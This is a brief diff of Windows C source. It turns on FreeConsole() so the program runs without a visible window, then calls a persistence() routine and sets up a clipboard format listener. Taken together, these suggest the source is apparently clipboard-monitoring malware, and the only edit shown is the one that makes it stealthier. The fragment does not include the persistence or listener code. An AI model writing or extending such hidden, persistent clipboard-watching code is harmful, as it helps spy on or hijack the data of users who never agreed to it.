@@ -81,7 +81,7 @@ LRESULT CALLBACK ClipboardFormatListenerProc(HWND hwnd, UINT imsg, WPARAM wParam
 }
 
 int main() {
-    //FreeConsole();
+    FreeConsole();
     persistence();
     WNDCLASSW wc = {0}; 
     wc.lpfnWndProc = ClipboardFormatListenerProc;
